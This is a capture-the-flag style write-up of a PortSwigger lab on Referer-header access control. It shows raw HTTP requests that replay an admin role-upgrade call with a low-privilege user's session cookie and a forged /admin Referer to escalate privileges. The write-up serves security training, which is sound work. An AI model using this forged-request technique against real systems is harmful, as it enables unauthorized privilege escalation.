## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/f068d0fd-917f-4b17-9a95-6255eb94d112)

## Solution:

> Some websites **base access controls on the Referer header submitted in the HTTP reques**t. The Referer header is generally added to requests by browsers to indicate the page from which a request was initiated.
>
> For example, suppose an application robustly enforces access control over the main administrative page at **/admin**, but for sub-pages such as **/admin/deleteUser** only inspects the Referer header. If the 
> Referer 
> header contains the main **/admin** URL, **then the request is allowed**.
> 
> In this situation, since the Referer header can be fully controlled by an attacker, they can forge direct requests to sensitive sub-pages, supplying the required Referer header, and so gain unauthorized access. 

#### Login as admin -

First lets familiarize ourselves by loggin in as admin.

Clicking onm admin panel link after loggin in, takes us to this page where we can change privileges of a user.

When we upgrade carlos user privileges, the request sent is as follows,

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a9f0016047a441d81097f3e003900e8.web-security-academy.net
Cookie: session=j2REEeD3vHVXEKzXE7q1Hi98AQ2pCmsz
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a9f0016047a441d81097f3e003900e8.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

We can see that it has a **referrer header** which points to **/admin**.

## Login as wiener -

Our goal now is to upgrade ourselves

Grab the cookie value of wiener.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c0ffd4fc-b436-4d69-8ccc-3acc4adac1f2)


Cookie of admin -  `j2REEeD3vHVXEKzXE7q1Hi98AQ2pCmsz`
Cookie of wiener - `5u7PdoLWbATX6gzuN3kWxwBpsYbPC7dd`

Send the request where the privileges were changed by admin but by replacing admin cookie with wiener's cookie (non-admin)

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/2
Host: 0a9f0016047a441d81097f3e003900e8.web-security-academy.net
Cookie: session=5u7PdoLWbATX6gzuN3kWxwBpsYbPC7dd
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a9f0016047a441d81097f3e003900e8.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

The focus of this lab is , if referrer based verification is made, then we can explioit it

#### With /admin in referrer header

We get `302 - redirect`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/e136b2b4-c355-4cfa-abb0-699f5c526b90)

#### Without /admin in referrer header

We get `401 - Unauthorized`

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/a884ecb4-5ca1-421f-96a1-6db2f5667f25)

Thus we solved the lab by upgrading ourselves(wiener) to higher privilege.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/c4d1440a-1f36-489f-b2fd-6dda2a93300d)




